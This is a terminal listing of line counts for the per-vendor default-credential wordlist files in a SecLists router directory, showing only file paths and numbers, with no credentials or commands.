        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/bandluxe_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kaiomy_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/vodafone_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/verizon_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pikatel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/intelbras_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/olitec_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/gigabyte_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/repotec_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hawking_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/gateway_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/smartrg_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/sitecom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/verizon_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dynalink_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/axesstel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tornado_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/bell_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/net-lynx_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/open-networks_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/kaon-media_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kozumi_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/legrand_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/msi_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/spectrum_default-passwords.txt
       14 /usr/share/seclists/Passwords/Default-Credentials/Routers/zte_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/tecom_default-passwords.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/actiontec_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/microcom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/medialink_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/scientific-atlanta_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/airlink-101_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/trust_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/telkom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/justec_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/soho_default-passwords.txt
        6 /usr/share/seclists/Passwords/Default-Credentials/Routers/linksys_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/ericsson_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/alcatel_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/planex_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/safecom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/digisol_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/fritz-box_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telsey_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/belgacom_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/westell_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dynex_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/planet_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/airnet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tenda_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/eci_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/ericsson_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/intellinet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/inventel_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/spectrum_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kingtype_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/franklin-wireless_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/kasda_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tornado_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/etec_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/canyon_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/marconi_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/eusso_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/benq_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/riger_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/trendnet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/geek-adsl_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/eminent_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/2wire_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/level-one_default-users.txt
       13 /usr/share/seclists/Passwords/Default-Credentials/Routers/technicolor_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/microcom_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/green-packet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/inca_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/prolink_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/ubee_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dick-smith-elec_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/cisco-linksys_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/inteno_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dynalink_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/noganet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/intellinet_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/hama_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/jensen-scandinavia_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kraun_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/draytek_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/a-link_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dick-smith-elec_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hitron-technologies_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telewell_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/ping-communication_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/tilgin_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/calix_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/addon_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/e-tech_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hamlet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/nucom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/crypto_default-users.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/sweex_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/ice.net_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/atlantis-land_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/kasda_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/q-tec_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/ambit_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hama_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pikatel_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/efficient-siemens_default-users.txt
       11 /usr/share/seclists/Passwords/Default-Credentials/Routers/README.md
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/eminent_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/axesstel_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/readynet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/trendchip_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/safecom_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/digitus_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/visionnet_default-users.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/xavi_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/x-micro_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/lg_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telsey_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/alvarion_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/topcom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/awb-networks_default-passwords.txt
        8 /usr/share/seclists/Passwords/Default-Credentials/Routers/zyxel_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/planet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/utstarcom_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/telkom_default-passwords.txt
        6 /usr/share/seclists/Passwords/Default-Credentials/Routers/trendnet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/icotera_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/level-one_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/mobily_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/teracom_default-passwords.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/comtrend_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/conexant_default-users.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/siemens_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/e-tech_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/beetel_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/planex_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/luxul_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/netis_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/sagem_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/billion_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/efficient-siemens_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/siemens_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/thomson-alcatel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/vtech_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/arcadyan_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/zoom_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/sitecom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/beetel_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/teltonika_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/eci_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/tenda_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/3com_default-passwords.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/netcomm_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/riger_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/inca_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pluscom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telus_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/netopia_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/cnet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/paradigm_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telus_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hitron-technologies_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/alcatel_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/tilgin_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/bell_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dynex_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/gigabyte_default-users.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/netopia_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/canyon_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/belkin_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/surecom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hawking_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/conceptronic_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/justec_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/askey_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/a-link_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/netgate_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/olitec_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telstra_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pace-plc_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/great-speed_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/buffalo_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/luxul_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/conexant_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/totolink_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pti_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/inexq_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/loopcomm_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/telstra_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/netcoretek_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/kaon-media_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/ovislink_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/netcoretek_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/comtrend_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/visionnet_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/netis_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/vodafone_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/teltonika_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/arris_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/web-excel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dasan_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/vonage_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/inteno_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pci_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/cd-r-king_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tot_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kaiomy_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/alcatel-lucent_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/western-digital_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/micronet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/rosewill_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/cbn_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/adtran_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dynamode_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/adtran_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/blitzz_default-users.txt
       11 /usr/share/seclists/Passwords/Default-Credentials/Routers/sagemcom_default-passwords.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/asus_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/bt_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/intracom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/jensen-scandinavia_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/airties_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/sky_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sierra-wireless_default-users.txt
        7 /usr/share/seclists/Passwords/Default-Credentials/Routers/netgear_default-passwords.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/pirelli_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/100fio-networks_default-passwords.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/tp-link_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/airlink-101_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tactio_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/great-speed_default-users.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/aztech_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/benq_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/binatone_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dslink_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/netcomm_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/x-micro_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tactio_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sagem_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/western-digital_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/samsung_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/edimax_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/westell_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/intelbras_default-users.txt
      168 /usr/share/seclists/Passwords/Default-Credentials/Routers/0ALL-USERNAMES-AND-PASSWORDS.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/open-networks_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/jaht_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/lg_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kraun_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/speedcom_default-passwords.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/prolink_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sonicwall_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/micronet_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/smartrg_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sierra-wireless_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/tecom_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/rosewill_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/askey_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/airties_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/baudtec_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/trendchip_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/genexis_default-users.txt
        7 /usr/share/seclists/Passwords/Default-Credentials/Routers/zyxel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/iball_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dell_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/scientific-atlanta_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/airlive_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/3bb_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/creative_default-users.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/arris_default-users.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/xavi_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/addon_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/ice.net_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/hamlet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dslink_default-users.txt
        6 /usr/share/seclists/Passwords/Default-Credentials/Routers/zhone_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/ovislink_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/msi_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/allied-data_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/artnet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/mobily_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/digisol_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/belkin_default-users.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/billion_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/alvarion_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kozumi_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/mymax_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/nucom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/lectron_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/davolink_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/eusso_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/eltex_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/medialink_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/paradigm_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sercomm_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/nokia_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/digicom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/humax_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/totolink_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/bec-technologies_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/arcadyan_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/v-link_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dell_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/motorola_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/tp-link_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/geek-adsl_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/intracom_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/fiber-home_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/alcatel-lucent_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/artnet_default-passwords.txt
        9 /usr/share/seclists/Passwords/Default-Credentials/Routers/zte_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/eltex_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/q-tec_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/cisco-linksys_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/telewell_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hot_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/belgacom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/amped-wireless_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/encore_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/draytek_default-users.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/d-link_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/buffalo_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/1net1_default-users.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/fiber-home_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/zonet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/mitrastar_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pronets_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/marconi_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/baytec_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/creative_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/net-lynx_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/asus_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/digitus_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/thomson-alcatel_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pace-plc_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/vtech_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/netgate_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sparkcom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dasan_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/sweex_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/adb_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/repotec_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/samsung_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/airrouter_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/motorola_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dovado_default-users.txt
        7 /usr/share/seclists/Passwords/Default-Credentials/Routers/netgear_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/iball_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/speedcom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/zioncom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/aolynk_default-passwords.txt
